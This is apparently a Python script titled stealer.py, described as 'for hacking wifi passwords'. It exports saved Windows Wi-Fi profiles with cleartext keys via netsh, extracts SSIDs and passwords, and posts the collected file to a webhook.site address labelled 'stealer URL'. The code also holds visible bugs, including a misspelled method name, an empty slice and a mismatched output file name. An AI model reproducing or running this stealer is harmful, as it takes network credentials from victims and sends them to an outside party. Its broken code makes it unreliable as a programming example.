# stealer.py
for hacking wifi passwords
import subprocess
import os
import sys
import requests


#stealer URL
url = 'https://webhook.site/ce2db41a-8dfa-46da-862a-9ebe5e6df0fa'






#create a file
password_file = open('passwords.txt', "w")
password_file.write("Hello sir! Here are your passwords:\n\n")
password_file.close()

#Lists
wifi_files = []
wifi_name = []
wifi_password = []

#Use Python to execute a window command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()
#Grab current directory
path = os.getcwd()

#Do the hackies
for filename in os.listdir(path):
               if filename.startswith("wi-fi") and filename.endswitch(".xml"):
                wifi_files.append(filename)
                for i in wifi_files:
                   with open(i, 'r') as f:
                         for line in f.readlines():
                                 if 'name' in line:
                                            stripped = line.strip()
                                            front =stripped[6:1]
                                            back = front[:-7]
                                            wifi_name.append(back)
                                 if 'keyMaterial' in line:
                                     stripped = line.strip()
                                     front = stripped[13:]
                                     back = front[:-14]
                                     wifi_password.append(back)
                                     for x, y in zip(wifi_name, wifi_password):
                                            sys.stdout = open("password.txt", "a")
                                            print("SSID: "+x, "Password: "+y, sep='\n')
                                            sys.stdout.close()
                                      
#send the hackies
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)
    
